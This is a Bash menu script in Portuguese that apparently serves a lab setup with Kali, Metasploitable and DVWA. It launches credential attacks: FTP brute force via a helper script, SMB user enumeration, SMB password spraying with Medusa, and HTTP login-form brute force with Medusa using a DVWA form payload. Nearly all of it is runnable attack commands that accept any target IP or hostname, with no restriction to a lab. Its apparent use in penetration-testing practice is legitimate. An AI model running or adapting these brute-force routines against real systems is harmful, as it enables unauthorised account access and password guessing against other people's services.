#!/usr/bin/env bash

# kali_metaexplot_tester - Menu principal
# Projeto: kali_metaexplot_tester
# Autor: William + ChatGPT
# Versão: 1.0

############################
#        CORES / ESTILO    #
############################

RESET="\e[0m"
BOLD="\e[1m"
DIM="\e[2m"

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"

INFO="${CYAN}[i]${RESET}"
WARN="${YELLOW}[!]${RESET}"
ERR="${RED}[X]${RESET}"
OK="${GREEN}[OK]${RESET}"

############################
#        CONFIG GERAL      #
############################

FTP_SCRIPT="./scripts/ftp_protocol"               # script FTP
SMB_ENUM_SCRIPT="./scripts/smb_enum_user.sh"      # enum users SMB
WEB_FORM_SCRIPT="./scripts/web_form_bruteforce.sh" # reservado pra futuro (se usar script próprio)

############################
#        FUNÇÕES COMUNS    #
############################

trap 'echo -e "\n${WARN} Interrompido pelo usuário. Saindo..."; exit 0' INT

pause() {
    echo
    read -rp "Pressione ENTER para voltar ao menu..." _
}

check_bin() {
    local bin="$1"
    if ! command -v "$bin" >/dev/null 2>&1; then
        echo -e "${ERR} Dependência não encontrada: ${BOLD}${bin}${RESET}"
        return 1
    fi
    return 0
}

check_exec() {
    local path="$1"
    if [[ ! -x "$path" ]]; then
        echo -e "${ERR} Script não encontrado ou sem permissão de execução:"
        echo -e "    ${BOLD}${path}${RESET}"
        echo -e "${INFO} Dica:  chmod +x ${path}"
        return 1
    fi
    return 0
}

banner() {
    clear
    echo -e "${MAGENTA}====================================================${RESET}"
    echo -e "${MAGENTA}   _  __     _ _       __  __      _        _       ${RESET}"
    echo -e "${MAGENTA}  | |/ /__ _| (_)_ __ |  \\/  | ___| |_ __ _| |___   ${RESET}"
    echo -e "${MAGENTA}  | ' // _\` | | | '_ \\| |\\/| |/ _ \\ __/ _\` | / -_)  ${RESET}"
    echo -e "${MAGENTA}  |_|_\\__,_|_|_| .__/ |_|  |_|\\___/\\__\\__,_|_\\___|  ${RESET}"
    echo -e "${MAGENTA}               |_|   kali_metaexplot_tester         ${RESET}"
    echo -e "${MAGENTA}====================================================${RESET}"
    echo -e " ${DIM}by William · Medusa · Kali · Metasploitable · DVWA${RESET}"
    echo
}

print_menu() {
    banner
    echo -e "${BOLD}Selecione uma opção:${RESET}"
    echo
    echo -e "  ${CYAN}[1]${RESET} FTP Brute Force         ${DIM}(Medusa via ${FTP_SCRIPT})${RESET}"
    echo -e "  ${CYAN}[2]${RESET} Enumeração SMB          ${DIM}(enum4linux via ${SMB_ENUM_SCRIPT})${RESET}"
    echo -e "  ${CYAN}[3]${RESET} SMB Password Spraying   ${DIM}(Medusa direto)${RESET}"
    echo -e "  ${CYAN}[4]${RESET} HTTP Form Brute Force   ${DIM}(Medusa direto)${RESET}"
    echo
    echo -e "  ${RED}[0]${RESET} Sair"
    echo
}

############################
#        AÇÕES DO MENU     #
############################

menu_ftp_bruteforce() {
    banner
    echo -e "${BOLD}[ FTP Brute Force - Medusa ]${RESET}"
    echo

    if ! check_exec "$FTP_SCRIPT"; then
        pause
        return
    fi

    read -rp "Alvo (IP ou hostname): " TARGET
    echo
    echo -e "${BOLD}Modo:${RESET}"
    echo -e "  [1] Single user  ${DIM}(-s)${RESET}"
    echo -e "  [2] Userlist     ${DIM}(-l)${RESET}"
    echo
    read -rp "Escolha (1 ou 2): " MODE
    echo

    case "$MODE" in
        1)
            read -rp "Usuário único: " USERNAME
            read -rp "Wordlist de senhas: " PASSLIST
            echo
            echo -e "${INFO} Comando:"
            echo -e "    ${BOLD}${FTP_SCRIPT} -s -t \"${TARGET}\" -u \"${USERNAME}\" -P \"${PASSLIST}\"${RESET}"
            echo
            $FTP_SCRIPT -s -t "$TARGET" -u "$USERNAME" -P "$PASSLIST"
            ;;
        2)
            read -rp "Wordlist de usuários: " USERLIST
            read -rp "Wordlist de senhas: " PASSLIST
            echo
            echo -e "${INFO} Comando:"
            echo -e "    ${BOLD}${FTP_SCRIPT} -l -t \"${TARGET}\" -U \"${USERLIST}\" -P \"${PASSLIST}\"${RESET}"
            echo
            $FTP_SCRIPT -l -t "$TARGET" -U "$USERLIST" -P "$PASSLIST"
            ;;
        *)
            echo -e "${WARN} Opção inválida."
            ;;
    esac

    pause
}

menu_smb_enum_users() {
    banner
    echo -e "${BOLD}[ Enumeração de Usuários SMB - enum4linux ]${RESET}"
    echo

    if ! check_exec "$SMB_ENUM_SCRIPT"; then
        pause
        return
    fi

    echo -e "${INFO} Executando enumeração SMB padrão..."
    echo
    "$SMB_ENUM_SCRIPT"

    pause
}

menu_smb_bruteforce() {
    banner
    echo -e "${BOLD}[ SMB Password Spraying / Brute Force - Medusa ]${RESET}"
    echo

    if ! check_bin medusa; then
        echo -e "${WARN} Instale o medusa antes de usar esta opção."
        pause
        return
    fi

    read -rp "Alvo (IP ou hostname): " TARGET
    read -rp "Wordlist de usuários (ex: users.txt): " USERLIST
    read -rp "Wordlist de senhas (ex: pass.txt): " PASSLIST
    echo

    # Se o seu medusa usar módulo 'smbnt', troque SMB por smbnt abaixo
    CMD="medusa -h \"${TARGET}\" -U \"${USERLIST}\" -P \"${PASSLIST}\" -M SMB -t 6"

    echo -e "${INFO} Comando:"
    echo -e "    ${BOLD}${CMD}${RESET}"
    echo

    medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" -M SMB -t 6

    pause
}

menu_web_form_bruteforce() {
    banner
    echo -e "${BOLD}[ HTTP Form Brute Force - Medusa ]${RESET}"
    echo -e "${DIM}(Exemplo simples: sem HTTPS, sem cookies)${RESET}"
    echo

    if ! check_bin medusa; then
        echo -e "${WARN} Instale o medusa antes de usar esta opção."
        pause
        return
    fi

    read -rp "Alvo (IP ou hostname): " TARGET
    read -rp "Página alvo (ex: /dvwa/login.php): " PAGETGT
    read -rp "Wordlist de usuários: " USERLIST
    read -rp "Wordlist de senhas: " PASSLIST
    echo

    echo -e "${INFO} Payload padrão do formulário:"
    echo -e "    ${BOLD}username=^USER^&password=^PASS^&Login=Login${RESET}"
    echo -e "${INFO} String de falha:"
    echo -e "    ${BOLD}FAIL=Login failed${RESET}"
    echo

    echo -e "${INFO} Comando:"
    echo -e "    ${BOLD}medusa -h \"${TARGET}\" -U \"${USERLIST}\" -P \"${PASSLIST}\" -M http \\"
    echo -e "           -m PAGE:'${PAGETGT}' \\"
    echo -e "           -m FORM:'username=^USER^&password=^PASS^&Login=Login' \\"
    echo -e "           -m 'FAIL=Login failed' -t 6${RESET}"
    echo

    medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" -M http \
        -m PAGE:"$PAGETGT" \
        -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
        -m 'FAIL=Login failed' -t 6

    pause
}

############################
#        LOOP PRINCIPAL    #
############################

while true; do
    print_menu
    read -rp "Opção: " OPT
    echo

    case "$OPT" in
        1) menu_ftp_bruteforce ;;
        2) menu_smb_enum_users ;;
        3) menu_smb_bruteforce ;;
        4) menu_web_form_bruteforce ;;
        0)
            echo -e "${OK} Saindo... até o próximo pentest de laboratório. 👋"
            exit 0
            ;;
        *)
            echo -e "${WARN} Opção inválida."
            sleep 1
            ;;
    esac
done
